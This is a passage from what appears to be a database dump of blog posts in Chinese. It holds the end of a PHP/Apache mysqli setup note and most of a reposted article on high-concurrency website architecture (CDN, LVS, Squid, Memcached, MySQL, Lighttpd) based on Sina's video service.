install</p>\r\n\r\n<p>不出错就会出现mysqli.so被生成在哪个目录下，把mysqli.so复制到/usr/php/ext下</p>\r\n\r\n<p>修改php.ini</p>\r\n\r\n<p>extension_dir=&quot;/usr/php/ext&quot;</p>\r\n\r\n<p>extension=mysqli.so</p>\r\n\r\n<p>6.3)配置apache能执行php文件</p>\r\n\r\n<p>修改apache的配置文件</p>\r\n\r\n<p>设置index.php为默认首页文件</p>\r\n\r\n<p>添加php后缀文件使用php解析&nbsp;&nbsp; AddType application/x-httpd-php .php</p>\r\n',0,1437038517,0,0),(17,5,'高并发高流量网站架构','<p>转自:http://www.williamlong.info/info/archives/287.html</p>\r\n\r\n<p>作者：唐福林（北京师范大学）</p>\r\n\r\n<p>摘要</p>\r\n\r\n<p>Web2.0的兴起，掀起了互联网新一轮的网络创业大潮。以用户为导向的新网站建设概念，细分了网站功能和用户群，不仅成功的造就了一大批新生的网站，也极大的方便了上网的人们。但Web2.0以用户为导向的理念，使得新生的网站有了新的特点&mdash;&mdash;高并发，高流量，数据量大，逻辑复杂等，对网站建设也提出了新的要求。</p>\r\n\r\n<p>本文围绕高并发高流量的网站架构设计问题，主要研究讨论了以下内容：</p>\r\n\r\n<p>首先在整个网络的高度讨论了使用镜像网站，CDN内容分发网络等技术对负载均衡带来的便利及各自的优缺点比较。然后在局域网层次对第四层交换技术，包括硬件解决方案F5和软件解决方案LVS，进行了简单的讨论。接下来在单服务器层次，本文着重讨论了单台服务器的Socket优化，硬盘级缓存技术，内存级缓存技术，CPU与IO平衡技术（即以运算为主的程序与以数据读写为主的程序搭配部署），读写分离技术等。在应用层，本文介绍了一些大型网站常用的技术，以及选择使用该技术的理由。最后，在架构的高度讨论了网站扩容，容错等问题。</p>\r\n\r\n<p>本文以理论与实践相结合的形式，结合作者实际工作中得到的经验，具有较广泛的适用性。</p>\r\n\r\n<p>1 引言</p>\r\n\r\n<p>1.1 互联网的发展</p>\r\n\r\n<p>最近十年间，互联网已经从一个单纯的用于科研的，用来传递静态文档的美国内部网络，发展成了一个应用于各行各业的，传送着海量多媒体及动态信息的全球网络。从规模上看，互联网在主机数、带宽、上网人数等方面几乎一直保持着指数增长的趋势，2006年7月，互联网上共有主机439，286，364台，WWW 站点数量达到 96，854，877个 ［1］。全球上网人口在2004 年达到 7 亿 2900万 ［2］，中国的上网人数在 2006 年 12 月达到了约 1亿3700 万［3］。另一方面，互联网所传递的内容也发生了巨大的变化，早期互联网以静态、文本的公共信息为主要内容，而目前的互联网则传递着大量的动态、多媒体及人性化的信息，人们不仅可以通过 互联网阅读到动态生成的信息，而且可以通过它使用电子商务、即时通信、网上游戏等交互性很强的服务。因此，可以说互联网已经不再仅仅是一个信息共享网络，而已经成为了一个无所不在的交互式服务的平台。</p>\r\n\r\n<p>1.2 互联网网站建设的新趋势</p>\r\n\r\n<p>互联网不断扩大的规模，日益增长的用户群，以及web2.0［4］的兴起，对互联网网站建设提出了新的要求：</p>\r\n\r\n<p>高性能和高可扩展性。2000 年 5 月，访问量排名世界第一（统计数据来源［5］）的Yahoo ［6］声称其日页浏览数达到 6 亿 2500 万，即每秒约 30，000 次HTTP 请求(按每个页面浏览平均产生 4 次请求计算) .这样大规模的访问量对服务的性能提出了非常高的要求。更为重要的是， 互联网受众的广泛性，使得成功的互联网服务的访问量增长潜力和速度非常大，因此服务系统必须具有非常好的可扩展性，以应付将来可能的服务增长。</p>\r\n\r\n<p>支持高度并发的访问。高度并发的访问对服务的存储与并发能力提出了很高的要求，当前主流的超标量和超流水线处理器能处理的并发请求数是有限的，因为随着并发数的上升，进程调度的开销会很快上升。互联网广域网的本质决定了其访问的延迟时间较长，因此一个请求完成时间也较长，按从请求产生到页面下载完成 3 秒计算， Yahoo 在 2000 年 5 月时平均有 90，000 个并发请求。而且对于较复杂的服务，服务器往往要维护用户会话的信息，例如一个互联网网站如果每天有 100 万次用户会话，每次 20分钟的话，那平均同时就会有约 14000 个并发会话。</p>\r\n\r\n<p>高可用性。互联网服务的全球性决定了其每天 24 小时都会有用户访问，因此任何服务的停止都会对用户造成影响。而对于电子商务等应用，暂时的服务中止则意味着客户的永久失去及大量的经济损失，例如ebay.com［7］1999 年 6 月的一次 22小时的网站不可访问，对此网站的 380万用户的忠诚度造成巨大影响，使得 Ebay 公司不得不支付了近500万美元用于补偿客户的损失，而该公司的市值同期下降了 40 亿美元［8］。因此，关键互联网应用的可用性要求非常高。</p>\r\n\r\n<p>1.3 新浪播客的简介</p>\r\n\r\n<p>以YouTube［9］为代表的微视频分享网站近来方兴未艾，仅2006年一年，国内就出现近百家仿YouTube的微视频分享网站［10］，试图复制YouTube的成功模式。此类网站可以说是Web2.0概念下的代表网站，具有Web2.0网站所有典型特征：高并发，高流量，数据量大，逻辑复杂，用户分散等等。新浪［11］作为国内最大的门户网站，在2005年成功运作新浪博客的基础上，于2006年底推出了新浪播客服务。新浪播客作为国内门户网站中第一个微视频分享服务的网站，依靠新浪网站及新浪博客的巨大人气资源，在推出后不到半年的时间内，取得了巨大的成功：同类网站中上传视频数量第一、流量增长最快、用户数最多［12］，所有这些成绩的取得的背后，是巨大的硬件投入，良好的架构支撑和灵活的应用层软件设计。</p>\r\n\r\n<p>本文是作者在新浪爱问搜索部门实习及参与新浪播客开发的经验和教训的回顾，是作者对一般高并发高流量网站架构的总结和抽象。</p>\r\n\r\n<p>2 网络层架构</p>\r\n\r\n<p>2.1 镜像网站技术</p>\r\n\r\n<p>镜像网站是指将一个完全相同的站点放到几个服务器上，分别有自己的URL，这些服务器上的网站互相称为镜像网站［13］。镜像网站和主站并没有太大差别，或者可以视为主站的拷贝。镜像网站的好处是：如果不能对主站作正常访问（如服务器故障，网络故障或者网速太慢等），仍能通过镜像服务器获得服务。不便之处是：更新网站内容的时候，需要同时更新多个服务器；需要用户记忆超过一个网址，或需要用户选择访问多个镜像网站中的一个，而用户选择的，不一定是最优的。在用户选择的过程中，缺乏必要的可控性。</p>\r\n\r\n<p>在互联网发展的初期，互联网上的网站内容很少，而且大都是静态内容，更新频率底。但因为服务器运算能力低，带宽小，网速慢，热门网站的访问压力还是很大。镜像网站技术在这种情况下作为一种有效解决方案，被广泛采用。随着互联网的发展，越来越多的网站使用服务器端脚本动态生成内容，同步更新越来越困难，对可控性要求越来越高，镜像技术因为不能满足这类网站的需要，渐渐的淡出了人们的视线。但有一些大型的软件下载站，因为符合镜像网站的条件&mdash;&mdash;下载的内容是静态的，更新频率较低，对带宽，速度要求又比较高，如国外的SourceForge （http://www.SourceForge.net，著名开源软件托管网站），Fedora（http://fedoraproject.org，RedHat赞助的Linux发行版），国内的华军软件园（http://www.onlinedown.net），天空软件站（http://www.skycn.com）等，还在使用这项技术（图1）。</p>\r\n\r\n<p>在网站建设的过程中，可以根据实际情况，将静态内容作一些镜像，以加快访问速度，提升用户体验。</p>\r\n\r\n<p>2.2 CDN内容分发网络</p>\r\n\r\n<p>CDN的全称是Content Delivery Network，即内容分发网络。其目的是通过在现有的互联网中增加一层新的网络架构，将网站的内容发布到最接近用户的网络&ldquo;边缘&rdquo;，使用户可以就近取得所需的内容，分散服务器的压力，解决互联网拥挤的状况，提高用户访问网站的响应速度。从而解决由于网络带宽小、用户访问量大、网点分布不均等原因所造成的用户访问网站响应速度慢的问题［14］。</p>\r\n\r\n<p>CDN与镜像网站技术的不同之处在于网站代替用户去选择最优的内容服务器，增强了可控制性。CDN其实是夹在网页浏览者和被访问的服务器中间的一层镜像或者说缓存，浏览者访问时点击的还是服务器原来的URL地址，但是看到的内容其实是对浏览者来说最优的一台镜像服务器上的页面缓存内容。这是通过调整服务器的域名解析来实现的。使用CDN技术的域名解析服务器需要维护一个镜像服务器列表和一份来访IP到镜像服务器的对应表。当一个用户的请求到来的时候，根据用户的IP，查询对应表，得到最优的镜像服务器的IP地址，返回给用户。这里的最优，需要综合考虑服务器的处理能力，带宽，离访问者的距离远近等因素。当某个地方的镜像网站流量过大，带宽消耗过快，或者出现服务器，网络等故障的时候，可以很方便的设置将用户的访问转到另外一个地方（图2）。这样就增强了可控制性。</p>\r\n\r\n<p>图2 CDN原理示意图</p>\r\n\r\n<p>CDN网络加速技术也有它的局限性。首先，因为内容更新的时候，需要同步更新多台镜像服务器，所以它也只适用于内容更新不太频繁，或者对实时性要求不是很高的网站；其次，DNS解析有缓存，当某一个镜像网站的访问需要转移时，主DNS服务器更改了IP解析结果，但各地的DNS服务器缓存更新会滞后一段时间，这段时间内用户的访问仍然会指向该服务器，可控制性依然有不足。</p>\r\n\r\n<p>目前，国内访问量较高的大型网站如新浪、网易等的资讯频道，均使用CDN网络加速技术（图3），虽然网站的访问量巨大，但无论在什么地方访问，速度都会很快。但论坛，邮箱等更新频繁，实时性要求高的频道，则不适合使用这种技术。</p>\r\n\r\n<p>图3 新浪网使用ChinaCache CDN服务。</p>\r\n\r\n<p>ChinaCache的服务节点全球超过130个，</p>\r\n\r\n<p>其中中国节点超过80个，</p>\r\n\r\n<p>覆盖全国主要6大网络的主要省份［15］。</p>\r\n\r\n<p>2.3 应用层分布式设计</p>\r\n\r\n<p>新浪播客为了获得CDN网络加速的优点，又必须避免CDN的不足，在应用层软件设计上，采取了一个替代的办法。新浪播客提供了一个供播放器查询视频文件地址的接口。当用户打开视频播放页面的时候，播放器首先连接查询接口，通过接口获得视频文件所在的最优的镜像服务器地址，然后再到该服务器去下载视频文件。这样，用一次额外的查询获得了全部的控制性，而这次查询的通讯流量非常小，几乎可以忽略不计。CDN中由域名解析获得的灵活性也保留了下来：由接口程序维护镜像网站列表及来访IP到镜像网站的对应表即可。镜像网站中不需要镜像所有的内容，而是只镜像更新速度较慢的视频文件。这是完全可以承受的。</p>\r\n\r\n<p>2.4 网络层架构小结</p>\r\n\r\n<p>从整个互联网络的高度来看网站架构，努力的方向是明确的：让用户就近取得内容，但又要在速度和可控制性之间作一个平衡。对于更新比较频繁内容，由于难以保持镜像网站之间的同步，则需要使用其他的辅助技术。</p>\r\n\r\n<p>3 交换层架构</p>\r\n\r\n<p>3.1 第四层交换简介</p>\r\n\r\n<p>按照OSI［16］七层模型，第四层是传输层。传输层负责端到端通信，在IP协议栈中是TCP和UDP所在的协议层。TCP和UDP数据包中包含端口号（port number），它们可以唯一区分每个数据包所属的协议和应用程序。接收端计算机的操作系统根据端口号确定所收到的IP包类型，并把它交给合适的高层程序。IP地址和端口号的组合通常称作&ldquo;插口（Socket）&rdquo;。</p>\r\n\r\n<p>第四层交换的一个简单定义是：它是一种传输功能，它决定传输不仅仅依据MAC地址(第二层网桥)或源/目标IP地址(第三层路由)，而且依据IP地址与TCP/UDP (第四层) 应用端口号的组合（Socket）［17］。第四层交换功能就像是虚拟IP，指向实际的服务器。它传输的数据支持多种协议，有HTTP、FTP、NFS、Telnet等。</p>\r\n\r\n<p>以HTTP协议为例，在第四层交换中为每个服务器组设立一个虚拟IP（Virtue IP，VIP），每组服务器支持某一个或几个域名。在域名服务器（DNS）中存储服务器组的VIP，而不是某一台服务器的真实地址。</p>\r\n\r\n<p>当用户请求页面时，一个带有目标服务器组的VIP连接请求发送给第四层交换机。第四层交换机使用某种选择策略，在组中选取最优的服务器，将数据包中的目标VIP地址用实际服务器的IP地址取代，并将连接请求传给该服务器。第四层交换一般都实现了会话保持功能，即同一会话的所有的包由第四层交换机进行映射后，在用户和同一服务器间进行传输［18］。</p>\r\n\r\n<p>第四层交换按实现分类，分为硬件实现和软件实现。</p>\r\n\r\n<p>3.2 硬件实现</p>\r\n\r\n<p>第四层交换的硬件实现一般都由专业的硬件厂商作为商业解决方案提供。常见的有Alteon［19］，F5［20］等。这些产品非常昂贵，但是能够提供非常优秀的性能和很灵活的管理能力。Yahoo中国当初接近2000台服务器使用了三四台Alteon就搞定了［21］。鉴于条件关系，这里不展开讨论。</p>\r\n\r\n<p>3.3 软件实现</p>\r\n\r\n<p>第四层交换也可以通过软件实现，不过性能比专业硬件稍差，但是满足一定量的压力还是可以达到的，而且软件实现配置起来更灵活。 软件四层交换常用的有Linux上的LVS（Linux Virtual Server），它提供了基于心跳（heart beat）的实时灾难应对解决方案，提高了系统的鲁棒性，同时提供了灵活的VIP配置和管理功能，可以同时满足多种应用需求［22］。</p>\r\n\r\n<p>4 服务器优化</p>\r\n\r\n<p>4.1 服务器整体性能考虑</p>\r\n\r\n<p>对于价值昂贵的服务器来说，怎样配置才能发挥它的最大功效，又不至于影响正常的服务，这是在设计网站架构的时候必须要考虑的。常见的影响服务器的处理速度的因素有：网络连接，硬盘读写，内存空间，CPU速度。如果服务器的某一个部件满负荷运转仍然低于需要，而其他部件仍有能力剩余，我们将之称为性能瓶颈。服务器想要发挥最大的功效，关键的是消除瓶颈，让所有的部件都被充分的利用起来。</p>\r\n\r\n<p>4.2 Socket优化</p>\r\n\r\n<p>以标准的 GNU/Linux 为例。GNU/Linux 发行版试图对各种部署情况都进行优化，这意味着对具体服务器的执行环境来说，标准的发行版可能并不是最优化的［23］。GNU/Linux 提供了很多可调节的内核参数，可以使用这些参数为服务器进行动态配置，包括影响 Socket 性能的一些重要的选项。这些选项包含在 /proc 虚拟文件系统中。这个文件系统中的每个文件都表示一个或多个参数，它们可以通过 cat 工具进行读取，或使用 echo 命令进行修改。这里仅列出一些影响TCP/IP 栈性能的可调节内核参数［24］：</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_window_scaling &ldquo;1&rdquo;（1表示启用该选项，0表示关闭，下同） 启用 RFC［25］ 1323［26］ 定义的 window scaling；要支持超过 64KB 的窗口，必须启用该值。</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_sack &ldquo;1&rdquo;启用有选择的应答（Selective Acknowledgment），通过有选择地应答乱序接收到的报文来提高性能（这样可以让发送者只发送丢失的报文段）；对于广域网通信来说，这个选项应该启用，但是这也会增加对 CPU 的占用。</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_timestamps &ldquo;1&rdquo; 以一种比重发超时更精确的方法（参阅 RFC 1323）来启用对 RTT 的计算；为了实现更好的性能应该启用这个选项。</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_mem &ldquo;24576 32768 49152&rdquo; 确定 TCP 栈应该如何反映内存使用；每个值的单位都是内存页（通常是 4KB）。第一个值是内存使用的下限。第二个值是内存压力模式开始对缓冲区使用应用压力的上限。第三个值是内存上限。超过这个上限时可以将报文丢弃，从而减少对内存的使用。</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_wmem &ldquo;4096 16384 131072&rdquo; 为自动调优定义每个 socket 使用的内存。第一个值是为 socket 的发送缓冲区分配的最少字节数。第二个值是默认值（该值会被 wmem_default 覆盖），缓冲区在系统负载不重的情况下可以增长到这个值。第三个值是发送缓冲区空间的最大字节数（该值会被 wmem_max 覆盖）。</p>\r\n\r\n<p>/proc/sys/net/ipv4/tcp_westwood &ldquo;1&rdquo; 启用发送者端的拥塞控制算法，它可以维护对吞吐量的评估，并试图对带宽的整体利用情况进行优化；对于 WAN 通信来说应该启用这个选项。</p>\r\n\r\n<p>与其他调优努力一样，最好的方法实际上就是不断进行实验。具体应用程序的行为、处理器的速度以及可用内存的多少都会影响到这些参数对性能作用的效果。在某些情况中，一些认为有益的操作可能恰恰是有害的（反之亦然）。因此，需要逐一试验各个选项，然后检查每个选项的结果，最后得出最适合具体机器的一套参数。</p>\r\n\r\n<p>如果重启了 GNU/Linux 系统，设置的内核参数都会恢复成默认值。为了将所设置的值作为这些参数的默认值，可以使用 /etc/rc.local 文件，在系统每次启动时自动将这些参数配置成所需要的值。</p>\r\n\r\n<p>在检测每个选项的更改带来的效果的时候，GNU/Linux上有一些非常强大的工具可以使用：</p>\r\n\r\n<p>ping 这是用于检查主机的可用性的最常用的工具，也可以用于计算网络带宽延时。</p>\r\n\r\n<p>traceroute 打印连接到特定网络主机所经过的一系列路由器和网关的路径（路由），从而确定每个 hop 之间的延时。</p>\r\n\r\n<p>netstat 确定有关网络子系统、协议和连接的各种统计信息。</p>\r\n\r\n<p>tcpdump 显示一个或多个连接的协议级的报文跟踪信息，其中包括时间信息，可以使用这些信息来研究不同协议的报文时间。</p>\r\n\r\n<p>Ethereal 以一个易于使用的图形化界面提供 tcpump （报文跟踪）的信息，支持报文过滤功能。</p>\r\n\r\n<p>iperf 测量 TCP 和 UDP 的网络性能；测量最大带宽，并汇报延时和数据报的丢失情况。</p>\r\n\r\n<p>4.3 硬盘级缓存</p>\r\n\r\n<p>硬盘级别的缓存是指将需要动态生成的内容暂时缓存在硬盘上，在一个可接受的延迟时间范围内，同样的请求不再动态生成，以达到节约系统资源，提高网站承受能力的目的。Linux环境下硬盘级缓存一般使用Squid［27］。</p>\r\n\r\n<p>Squid是一个高性能的代理缓存服务器。和一般的代理缓存软件不同，Squid用一个单独的、非模块化的、I/O驱动的进程来处理所有的客户端请求。它接受来自客户端对目标对象的请求并适当地处理这些请求。比如说，用户通过浏览器想下载（即浏览）一个web页面，浏览器请求Squid为它取得这个页面。Squid随之连接到页面所在的原始服务器并向服务器发出取得该页面的请求。取得页面后，Squid再将页面返回给用户端浏览器，并且同时在Squid本地缓存目录里保存一份副本。当下一次有用户需要同一页面时，Squid可以简单地从缓存中读取它的副本，直接返回给用户，而不用再次请求原始服务器。当前的Squid可以处理HTTP， FTP， GOPHER， SSL和WAIS等协议。</p>\r\n\r\n<p>Squid默认通过检测HTTP协议头的Expires和 Cache-Control字段来决定缓存的时间。在实际应用中，可以显式的在服务器端脚本中输出HTTP头，也可以通过配置apache的mod_expires模块，让apache自动的给每一个网页加上过期时间。对于静态内容，如图片，视频文件，供下载的软件等，还可以针对文件类型（扩展名），用 Squid 的 refresh_pattern 来指定缓存时间。</p>\r\n\r\n<p>Squid 运行的时候，默认会在硬盘上建两层hash目录，用来存储缓存的Object.它还会在内存中建立一个Hash Table，用来记录硬盘中Object分布的情况。如果Squid配置成为一个Squid集群中的一个的话，它还会建立一个 Digest Table(摘要表)，用来存储其它 Squid 上的Object摘要。当用户端想要的资料本地硬盘上没有时，可以很快的知道应该去集群中的哪一台机器获得。在硬盘空间快要达到配置限额的时候，可以配置使用某种策略（默认使用LRU：Least Recently Used-最近最少用）删除一些Object，从而腾出空间［28］［29］。</p>\r\n\r\n<p>集群中的Squid Server 之间可以有两种关系：第一种关系是：Child 和 Parent.当 Child Squid Server 没有资料时，会直接向 Parent Squid Server 要资料，然后一直等，直到 Parent 给它资料为止。 第二种关系是：Sibling 和 Sibling.当 Squid Server 没有资料时，会先向 Sibling 的 Squid Server 要资料，如果 Sibling 没资料，就跳过它向 Parent 要或直接上原始网站去拿。</p>\r\n\r\n<p>默认配置的Squid，没有经过任何优化的时候，一般可以达到 50% 的命中率［30］（图4）。如果需要，还可以通过参数优化，拆分业务，优化文件系统等办法，使得Squid达到 90% 以上的缓存命中率。 Squid处理TCP连接消耗的服务器资源比真正的HTTP服务器要小的多，当Squid分担了大部分连接，网站的承压能力就大大增强了。</p>\r\n\r\n<p>4 某网站使用MRTG工具检测到的Squid命中率</p>\r\n\r\n<p>蓝线表示Squid的流量，绿色部分表示Apache流量</p>\r\n\r\n<p>4.4 内存级缓存</p>\r\n\r\n<p>内存级别的缓存是指将需要动态生成的内容暂时缓存在内存里，在一个可接受的延迟时间范围内，同样的请求不再动态生成，而是直接从内存中读取。Linux环境下内存级缓存Memcached［31］是一个不错的选择。</p>\r\n\r\n<p>Memcached是danga.com（运营Live Journal［32］的技术团队）开发的一套非常优秀的分布式内存对象缓存系统，用于在动态系统中减少数据库负载，提升性能。和 Squid 的前端缓存加速不同，它是通过基于内存的对象缓存来减少数据库查询的方式改善网站的性能，而其中最吸引人的一个特性就是支持分布式部署；也就是说可以在一群机器上建立一堆 Memcached 服务，每个服务可以根据具体服务器的硬件配置使用不同大小的内存块，这样，理论上可以建立一个无限大的基于内存的缓存系统。</p>\r\n\r\n<p>Memcached 是以守护程序方式运行于一个或多个服务器中，随时接受客户端的连接操作，客户端可以由各种语言编写，目前已知的客户端 API 包括 Perl/PHP/Python/Ruby/Java/C#/C 等等[附录1].客户端首先与 Memcached 服务建立连接，然后存取对象。每个被存取的对象都有一个唯一的标识符 key，存取操作均通过这个 key 进行，保存的时候还可以设置有效期。保存在 Memcached 中的对象实际上是放置在内存中的，而不是在硬盘上。Memcached 进程运行之后，会预申请一块较大的内存空间，自己进行管理，用完之后再申请一块，而不是每次需要的时候去向操作系统申请。Memcached将对象保存在一个巨大的Hash表中，它还使用NewHash算法来管理Hash表，从而获得进一步的性能提升。所以当分配给Memcached的内存足够大的时候，Memcached的时间消耗基本上只是网络Socket连接了［33］。</p>\r\n\r\n<p>Memcached也有它的不足。首先它的数据是保存在内存当中的，一旦服务进程重启（进程意外被关掉，机器重启等），数据会全部丢失。其次Memcached以root权限运行，而且Memcached本身没有任何权限管理和认证功能，安全性不足。第一条是Memcached作为内存缓存服务使用无法避免的，当然，如果内存中的数据需要保存，可以采取更改Memcached的源代码，增加定期写入硬盘的功能。对于第二条，我们可以将Memcached服务绑定在内网IP上，通过Linux防火墙进行防护。</p>\r\n\r\n<p>4.5 CPU与IO均衡</p>\r\n\r\n<p>在一个网站提供的所有功能中，有的功能可能需要消耗大量的服务器端IO资源，像下载，视频播放等，而有的功能则可能需要消耗大量的服务器CPU资源，像视频格式转换，LOG统计等。在一个服务器集群中，当我们发现某些机器上CPU和IO的利用率相差很大的时候，例如CPU负载很高而IO负责很低，我们可以考虑将该服务器上的某些耗CPU资源的进程换成耗IO的进程，以达到均衡的目的。均衡每一台机器的CPU和IO消耗，不仅可以获得更充分的服务器资源利用，而且还能够支持暂时的过载，遇到突发事件，访问流量剧增的时候， 实现得体的性能下降(Graceful performance degradation)［34］，而不是立即崩溃。</p>\r\n\r\n<p>4.6 读写分离</p>\r\n\r\n<p>如果网站的硬盘读写性能是整个网站性能提升的一个瓶颈的话，可以考虑将硬盘的读，写功能分开，分别进行优化。在专门用来写的硬盘上，我们可以在Linux下使用软件RAID-0（磁盘冗余阵列0级）［35］。RAID-0在获得硬盘IO提升的同时，也会增加整个文件系统的故障率&mdash;&mdash;它等于RAID中所有驱动器的故障率之和。如果需要保持或提高硬盘的容错能力，就需要实现软件RAID-1，4或5，它们能在某一个（甚至几个）磁盘驱动器故障之后仍然保持整个文件系统的正常运行［36］，但文件读写效率不如RAID-0.而专门用来读的硬盘，则不用如此麻烦，可以使用普通的服务器硬盘，以降低开销。</p>\r\n\r\n<p>一般的文件系统，会综合考虑各种大小和格式的文件的读，写效率，因而对特定的文件读或写的效率不是最优。如果有必要，可以通过选择文件系统，以及修改文件系统的配置参数来达到对特定文件的读或写的效率最大化。比如说，如果文件系统中需要存储大量的小文件，则可以使用ReiserFS［37］来替代Linux操作系统默认的ext3系统，因为ReiserFS是基于平衡树的文件系统结构，尤其对于大量文件的巨型文件系统，搜索速度要比使用局部的二分查找法的ext3快。 ReiserFS里的目录是完全动态分配的，因此不存在ext3中常见的无法回收巨型目录占用的磁盘空间的情况。ReiserFS里小文件（&lt; 4K）可以直接存储进树，小文件读取和写入的速度更快，树内节点是按字节对齐的，多个小文件可共享同一个硬盘块，节约大量空间。ext3使用固定大小的块分配策略，也就是说，不到4K的小文件也要占据4K的空间，导致的空间浪费比较严重［38］。 但ReiserFS对很多Linux内核支持的不是很好，包括2.4.3、2.4.9 甚至相对较新的 2.4.16，如果网站想要使用它，就必须要安装与它配合的较好的2.4.18内核&mdash;&mdash;一般管理员都不是很乐意使用太新的内核，因为在它上面运行的软件，都还没有经过大量的实践测试，也许有一些小的bug还没有被发现，但对于服务器来说，再小的bug也是不能接受的。ReiserFS还是一个较为年轻的，发展迅速的文件系统，它相对于ext3来说有一个很大的缺陷就是，每次ReiserFS文件系统升级的时候，必须完全重新格式化整个磁盘分区。所以在选择使用的时候，需要权衡取舍［39］。</p>\r\n\r\n<p>5 应用程序层优化</p>\r\n\r\n<p>5.1 网站服务器程序的选择</p>\r\n\r\n<p>经统计［40］，当前互联网上有超过50%的网站主机使用Apache［41］服务器程序。 Apache是开源界的首选Web服务器，因为它的强大和可靠，而且适用于绝大部分的应用场合。但是它的强大有时候却显得笨重，配置文件复杂得让人望而生畏，高并发情况下效率不太高。而轻量级的Web服务器Lighttpd［42］却是后起之秀，基于单进程多路复用技术，其静态文件的响应能力远高于Apache. Lighttpd对PHP的支持也很好，还可以通过Fastcgi方式支持其他的语言，比如Python等。 虽然Lighttpd是轻量级的服务器，功能上不能跟Apache比，某些复杂应用无法胜任，但即使是大部分内容动态生成的网站，仍免不了会有一些静态元素，比如图片、JS脚本、CSS等等，可以考虑将Lighttpd放在Squid的前面，构成 Lighttpd-&gt;Squid-&gt;Apache的一条处理链，Lighttpd在最前面，专门处理静态内容的请求，把动态内容请求通过Proxy模块转发给Squid，如果Squid中有该请求的内容且没有过期，则直接返回给Lighttpd.新请求或者过期的页面请求交由Apache中的脚本程序来处理。经过Lighttpd和Squid的两级过滤，Apache需要处理的请求大大减少，减少了Web应用程序的压力。同时这样的构架，便于把不同的处理分散到多台计算机上进行，由Lighttpd在前面统一分发。</p>\r\n\r\n<p>在这种架构下，每一级都是可以进行单独优化的，比如Lighttpd可以采用异步IO方式，Squid可以启用内存来缓存，Apache可以启用MPM（Multi -Processing Modules，多道处理模块）等，并且每一级都可以使用多台机器来均衡负载，伸缩性好。</p>\r\n\r\n<p>著名视频分享网站YouTube就是选择使用Lighttpd作为网站的前台服务器程序。</p>\r\n\r\n<p>5.2 数据库选择</p>\r\n\r\n<p>MySQL［43］是一个快速的、多线程、多用户和健壮的SQL数据库服务器，支持关键任务、重负载系统的使用，是最受欢迎的开源数据库管理系统，是Linux下网站开发的首选。它由MySQL AB开发、发布和提供支持。</p>\r\n\r\n<p>MySQL数据库能为网站提供：</p>\r\n\r\n<p>高性能。MySQL支持海量，快速的数据库存储和读取。还可以通过使用64位处理器来获取额外的一些性能，因为MySQL在内部里很多时候都使用64位的整数处理。</p>\r\n\r\n<p>易用性。MySQL的核心是一个小而快速的数据库。它的快速连接，快速存取和安全可靠的特性使MySQL非常适合在互联网站上使用。</p>\r\n\r\n<p>开放性。MySQL提供多种后台存储引擎的选择，如MyISAM， Heap， InnoDB，Berkeley Db等。缺省格式为MyISAM. MyISAM 存储引擎与磁盘兼容的非常好［44］。</p>\r\n\r\n<p>支持企业级应用。MySQL有一个用于记录数据改变的二进制日志。因为它是二进制的，这一日志能够快速地将数据的更改从一台机器复制（replication）到另一台机器上。即使服务器崩溃，这一二进制日志也能够保持完整。这一特性通常被用来搭建数据库集群，以支持更大的流量访问要求［30］（图5）。</p>\r\n\r\n<p>5 MySQL主辅库模式集群示意</p>\r\n\r\n<p>MySQL也有一些它自身的缺陷，如缺乏图形界面，缺乏存储过程， 还不支持触发器，参照完整性，子查询和数据表视图等，但这些功能都在开发者的TO-DO列表当中。这就是开源的力量：你永远可以期待更好。</p>\r\n\r\n<p>国外的Yahoo！，国内的新浪，搜狐等很多大型商业网站都使用MySQL 作为后台数据库。对于一般的网站系统，无论从成本还是性能上考虑，MySQL应该是最佳的选择。</p>\r\n\r\n<p>5.3 服务器端脚本解析器的选择</p>\r\n\r\n<p>目前最常见的服务器端脚本有三种：ASP(Active Server Pages)，JSP(Java Server Pages)，PHP (Hypertext Preprocessor)［45］［46］。</p>\r\n\r\n<p>ASP全名Active Server Pages，以及它的升级ASP.NET，是微软公司出品的一个WEB服务器端的开发环境，利用它可以产生和运行动态的、交互的、高性能的WEB服务应用程序。ASP采用脚本语言VBScript（C#）作为自己的开发语言。 但因为只能运行在Windows环境下，这里我们不讨论它。</p>\r\n\r\n<p>PHP是一种跨平台的服务器端的嵌入式脚本语言。它大量地借用C，Java和Perl语言的语法， 并耦合PHP自己的特性，使WEB开发者能够快速地写出动态生成页面。它支持目前绝大多数数据库。PHP也是开源的，它的发行遵从GPL开源协议，你可以从 PHP官方站点(http://www.php.net)自由下载到它的二进制安装文件及全部的源代码。如果在Linux平台上与MySQL搭配使用，PHP是最佳的选择。</p>\r\n\r\n<p>JSP是Sun公司推出的新一代站点开发语言，是Java语言除Java应用程序和Java Applet之外的第三个应用。Jsp可以在Serverlet和JavaBean的支持下，完成功能强大的站点程序。 作为采用Java技术家族的一部分，以及Java 2（企业版体系结构）的一个组成部分，JSP技术拥有Java技术带来的所有优点，包括优秀的跨平台性，高度可重用的组件设计，健壮性和安全性等，能够支持高度复杂的基于Web的应用。</p>\r\n\r\n<p>除了这三种常见的脚本之外，在Linux下我们其实还有很多其他的选择：Python（Google使用），Perl等，如果作为CGI调用，那么可选择范围就更广了。使用这些不太常见的脚本语言的好处是，它们对于某些特殊的应用有别的脚本所不具有的优势；不好的地方是，这些脚本语言在国内使用的人比较少，当碰到技术上的问题的时候，能找到的资料也较少。</p>\r\n\r\n<p>5.4 可配置性</p>\r\n\r\n<p>在大型网站开发过程中，不管使用什么技术，网站的可配置性是必须的。在网站的后期运营过程中，肯定会有很多的需求变更。如果每一次的需求变更都会导致修改源代码，那么，这个网站的开发可以说是失败的。</p>\r\n\r\n<p>首先，也是最重要的一点，功能和展示必须分开。PHP和JSP都支持模板技术，如PHP的Smarty，Phplib，JSP的JSTL（JSP Standard Tag 